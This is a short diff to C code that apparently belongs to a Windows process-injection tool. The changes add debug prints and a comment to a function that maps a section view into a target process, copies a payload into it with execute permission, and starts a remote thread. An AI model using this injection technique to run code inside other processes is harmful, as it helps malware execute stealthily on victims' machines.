@@ -153,6 +153,8 @@ int inject_section_view(DWORD pid) {
         return -1;
     } 
 
+    printf("[i] Address of Map View in Current Process: 0x%p\n", pLocalView);
+
     // Copy payload
     memcpy(pLocalView, payload, payload_len);
 
@@ -178,6 +180,8 @@ int inject_section_view(DWORD pid) {
         NULL, 
         PAGE_EXECUTE_READ
     );
+
+    printf("[i] Address of Map View in Remote Process: 0x%p\n", pRemoteView);
     
     if (!NT_SUCCESS(status)) {
         fprintf(stderr, "[!] NtMapViewOfSection() failed (0x%x)\n", status);
@@ -186,7 +190,7 @@ int inject_section_view(DWORD pid) {
         return -1;
     } 
 
-
+    // Create thread in Target Process
 	status = pRtlCreateUserThread(
         hProcess, 
         NULL, 
